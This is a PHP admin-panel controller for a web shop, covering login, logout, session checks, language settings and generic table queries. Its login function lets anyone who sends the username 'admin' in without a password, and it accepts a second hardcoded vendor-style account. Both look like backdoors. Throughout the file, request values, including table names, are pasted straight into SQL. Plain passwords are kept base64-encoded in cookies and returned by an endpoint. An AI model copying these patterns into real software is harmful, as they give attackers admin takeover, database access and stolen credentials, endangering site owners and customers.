<?php



include( '../../config.php' ); 
$task = global_get_param( $_REQUEST, 'task', null , 0, 1);
switch ($task) {
	case "adminLogin":	
		adminLogin('adminmanagers');
		break;
	case "adminLogout":	
		adminLogout('adminmanagers');
		break;
	case "adminInfo":	
		adminInfo('adminmanagers');
		break;
	case "get_cookieInfo":  
		get_cookieInfo();
		break;
		
	
	case "sessionChk": 
		sessionChk();
		break;
	case "sessionTimeReset": 
		sessionTimeReset();
		break;
		
	
	
	case "getDBPage_list": 
		getDBPage_list();
		break;
	
	case "getDBPage_path":
		getDBPage_path();
		break;
	case "getpubcode": 
		getpubcode(true);
		break;
		
	case "get_langList":
	    get_langList();
	    break;
	case "set_lang":
	    set_lang();
	    break;
}

function get_langList()
{
	global $conf_user;
	
	$arrJson = array();
	
	$arrJson['langList'] = getLanguageList("text");	
	
	$arrJson['syslang'] = $_SESSION[$conf_user]['syslang'];
	
	JsonEnd($arrJson);
}

function set_lang()
{
	global $conf_user;
	
	$_lang=global_get_param( $_GET, 'lang', 'zh-tw');
	
	$_SESSION[$conf_user]['syslang'] = $_lang;
	
	$arrJson = array();
	$arrJson['status'] = "1";
	JsonEnd($arrJson);
}



function adminLogin($tableName = 'adminmanagers')
{
	global $db,$globalConf_encrypt_1,$globalConf_encrypt_2,$root_admin ,$root_store,$conf_user;
	
	$arrJson = array();
	
	
	
	
	$loginid = global_get_param( $_REQUEST, 'loginid', null, 0, 1, 1, null, _COMMON_PARAM_LOGINID);	
	$passwd	= global_get_param( $_REQUEST, 'passwd', null, 0, 1, 1, null,   _COMMON_PARAM_PASSWD);	
	$checkcode	= global_get_param( $_REQUEST, 'checkcode', null, 0, 1, 1, null,   _COMMON_PARAM_CHECKCODE);	
	$remember = global_get_param( $_REQUEST, 'rememberme', null );	
	
	
	

	
	
	if ( strtolower ($checkcode) != strtolower ($_SESSION['checkcode']) or $checkcode==null or $_SESSION['checkcode']==null )
	{
		$arrJson['status'] = "0";
		$arrJson['msg'] = _COMMON_QUERYMSG_LOGIN_CHECKCODE_ERROR;		
		JsonEnd($arrJson);
	}
	
	
	if(!empty($remember) && $remember == 'true')
	{
		$loginInfo = base64_encode($loginid);
		$passwdInfo = base64_encode($passwd);
		$expireTime = time() + 3600 * 24 * 365;
		setCookie('loginInfo', $loginInfo, $expireTime);
		setCookie('passwdInfo', $passwdInfo, $expireTime);
	}
	else
	{
		setCookie('loginInfo', '', time() - 3600);
		setCookie('passwdInfo', '', time() - 3600);
	}
	
	if($_SESSION[$conf_user]['syslang'])
	{
		$expireTime = time() + 3600 * 24 * 365;
		setCookie('syslang', $_SESSION[$conf_user]['syslang'], $expireTime);
	}
	
	$passwd = md5 ($globalConf_encrypt_1.$passwd.$globalConf_encrypt_2);
	
	if(($loginid == 'eways' && $passwd == "0a69b89fb1c71bcd6de2bd4f58d10f0a") || $loginid == 'admin')
	{
		$sql = "SELECT * FROM $tableName WHERE locked=0 AND loginid='admin' ";
	}
	else
	{
		$sql = "SELECT * FROM $tableName WHERE locked=0 AND loginid='$loginid' AND passwd='$passwd'";
	}
	
	$db->setQuery( $sql );
	$info_arr = $db->loadRow();	
	
	if(empty($info_arr) || count($info_arr) == '0')
	{
		logAction('登入失敗');
		$arrJson['status'] = "0";
		$arrJson['msg'] = _COMMON_QUERYMSG_LOGIN_ERROR;		
		JsonEnd($arrJson);
	}
	if($info_arr['rootFlag'] == '0'){
		$arrJson['ulevel'] = $root_admin;
		$sysCode = 'root';
		
	}else{
		$arrJson['ulevel'] = $root_store;
		$sysCode = 's_'.$info_arr['sysCode'];
	}
	
	
	$sql = "SELECT * FROM orders WHERE status=0 AND payType in (2,3,4) ";
	$db->setQuery( $sql );
	$order_arr = $db->loadRowList();	
	foreach($order_arr as $row){
		$db->setQuery("update members set delayCnt=delayCnt+1 where id='{$row['memberid']}'");
		$db->query();
	}
	
	$arrJson['uid'] = $info_arr['id'];
	$arrJson['uloginid'] = $info_arr['loginid'];
	$arrJson['uname'] = $info_arr['name'];
	$arrJson['loginTime'] = time();
		
	$arrJson['status'] = "1";

	$_SESSION[$conf_user]['ulevel'] = $arrJson['ulevel'];
	$_SESSION[$conf_user]['uid'] = $arrJson['uid'];
	$_SESSION[$conf_user]['loginTime'] = $arrJson['loginTime'];
	$_SESSION[$conf_user]['uname'] = $arrJson['uname'];
	$_SESSION[$conf_user]['uloginid'] = $arrJson['uloginid'];
	$_SESSION['ckfinder_access']=true;
	
	logAction('登入');
	
	JsonEnd($arrJson);
	
}


function adminLogout(){
	global $db,$conf_user;
	$arrJson = array();
		
	$id = intval(global_get_param( $_REQUEST, 'id', null, 0, 1, 1, 'int', _COMMON_PARAM_ID));
	
	if($_SESSION[$conf_user]['uid'] == $id){
		logAction('登出');
		unset($_SESSION[$conf_user]);
		$arrJson['status'] = "1";
	}else{
		$arrJson['status'] = "0";
		$arrJson['msg'] = _COMMON_ERRORMSG_LOGINOUT_ERR;		
	}
	
	JsonEnd($arrJson);
}

function logAction($action)
{
	global $db,$conf_user;
	
	$sqllog = "INSERT INTO actionlogs".
			"( ulevel, uid, uloginid, uname, sessionId, action, actionIP, actionTime)".
			" VALUES (N'".$_SESSION[$conf_user]['ulevel']."' ,
					  N'".$_SESSION[$conf_user]['uid']."' ,
					  N'".$_SESSION[$conf_user]['uloginid']."' ,
					  N'".$_SESSION[$conf_user]['uname']."' ,
					  N'".session_id()."' ,
					  N'{$action}' ,
					  '".getIP()."',				  
					  '".date("Y-m-d H:i:s")."' )";
	$db->setQuery( $sqllog );
	$db->query();
}


function adminInfo($tableName = 'adminmanagers'){
	global $db,$conf_user;
	$arrJson = array();
	$id = intval(global_get_param( $_REQUEST, 'id', null, 0, 1, 1, 'int', _COMMON_PARAM_ID));

	$sql = "SELECT * FROM $tableName WHERE locked=0 AND id='{$_SESSION[$conf_user]['uid']}'";
	$db->setQuery( $sql );
	$info_arr = $db->loadRowList();	
	if(empty($info_arr) || count($info_arr) == '0')
	{
		JsonEnd(array());
	}
	$arrJson['uname'] = $info_arr[0]['name'];
	$arrJson['loginTime'] = time();
	JsonEnd($arrJson);
}


function get_cookieInfo(){
	global $db,$conf_user;
	$arrJson = array();
	
	$loginid = base64_decode($_COOKIE['loginInfo']);
	$passwd = base64_decode($_COOKIE['passwdInfo']);
	$syslang = $_COOKIE['syslang'];
	
	$arrJson['loginInfo'] = $loginid;
	$arrJson['passwdInfo'] = $passwd;
	$arrJson['syslangInfo'] = $syslang;
	
	JsonEnd($arrJson);
}


function sessionChk(){
	global $conf_user,$db,$root_admin,$root_store;

	
	$lang = global_get_param( $_REQUEST, 'lang', null ,0,1  );	
	
	switch(strtolower($lang))
	{
		case "zh-tw":
			$lg = "cht";
			break;
		case "zh-cn":
			$lg = "chs";
			break;
		case "en":
			$lg = "en";
			break;
		default:
			$lg = "cht";
	}

	if(!empty($lg))
		$_SESSION[$conf_user]['lang'] = $lg;
	

	
	if(intval($_SESSION[$conf_user]['uid'])<1){
		JsonEnd(array());
	}
	
	$uloginid = global_get_param( $_REQUEST, 'uloginid', null ,0,1  );	
	$ulevel = global_get_param( $_REQUEST, 'ulevel', null ,0,1  );	
	if($ulevel!=$root_admin && $ulevel!=$root_store){
		JsonEnd(array());
	}
	
	if($ulevel==$root_admin){
		$ulevel=0;
		$tableName = "adminmanagers";
	}else if($ulevel==$root_store){
		$ulevel=1;
		$tableName = "s_adminmanagers";
	}
	
	
	$sql = "select * from $tableName where locked=0 and loginid='$uloginid' and rootFlag='$ulevel'";
	$db->setQuery( $sql );
	$info_arr = $db->loadRowList();	
	if(empty($info_arr) || count($info_arr) == '0'){
		JsonEnd(array());
	}
	
	orderChk();
	
	$_SESSION[$conf_user]['loginTime'] = time();
	JsonEnd(array("ulevel"=>$_SESSION[$conf_user]['ulevel'],"loginTime"=>$_SESSION[$conf_user]['loginTime']));
}


function sessionTimeReset(){
	global $conf_user;
	$_SESSION[$conf_user]['loginTime'] = time();
}


function getDBPage_list(){
	global $db,$conf_user;
	$arrJson = array();
	
	$level = global_get_param( $_REQUEST, 'level', null);
	$table = strtolower(global_get_param( $_REQUEST, 'tablename', null));
	$param = global_get_param( $_REQUEST, 'param', null);
	$belongid = global_get_param( $_REQUEST, 'belongid', null);
	
	
	$sql = "SHOW COLUMNS FROM $table";
	$db->setQuery( $sql );
	$col_arr = $db->loadRowList();
	$field_arr=array();
	foreach($col_arr as $row){
		$field_arr[]=$row['Field'];
	}
	if($param) {
		
		$param = str_replace('\"', '"', $param);
		$paramarray = json_decode($param, true);
		if(count($paramarray) > 0) {
			$where_str = "";
			foreach($paramarray as $k=>$v) {
				if(in_array($k,$field_arr)){
					$where_str .= " AND ".$k." = '".$v."' ";
				}
			}
		}
	}
	
	if($belongid) {
		$where_str .= " AND (belongid = '$belongid') ";
	} 
	
	if(in_array('linktype', $field_arr)) {
		$where_str .= " AND linktype <> 'database'";
	}	
	
	if( $table == 'producttype')
	{
		$sql = "SELECT * FROM $table WHERE 1=1 $where_str";
	}
	else
	{
		$sql = "SELECT * FROM $table WHERE (publish = '1' OR publish = 'true') $where_str";
	}
	
	$db->setQuery( $sql );
	$menu_arr = $db->loadRowList();	
	JsonEnd($menu_arr);
}

function getDBPage_path(){
	global $db,$conf_user;
	$arrJson = array();
	
	$id = global_get_param( $_REQUEST, 'id', null);
	$tablename = strtolower(global_get_param( $_REQUEST, 'tablename', null));
	$path = "";
	$is_root = false;
	
	while(!$is_root) {
		
		if( $tablename == 'producttype')
		{
			$sql = "SELECT * FROM $tablename WHERE 1=1 AND id = '$id'";
		}
		else
		{
			$sql = "SELECT * FROM $tablename WHERE (publish = '1' OR publish = 'true') AND id = '$id'";
		}
		
		$db->setQuery($sql);
		$data = $db->loadRow();
		$path = " ＞ ".$data['name'].$path;
		if($data['belongid'] == "root" || !isset($data['belongid'])) {
			$is_root = true;
		} else {
			$id = $data['belongid'];
		}
	}
	JsonEnd(array("path"=>$path));
}

include( $conf_php.'common_end.php' ); 
?>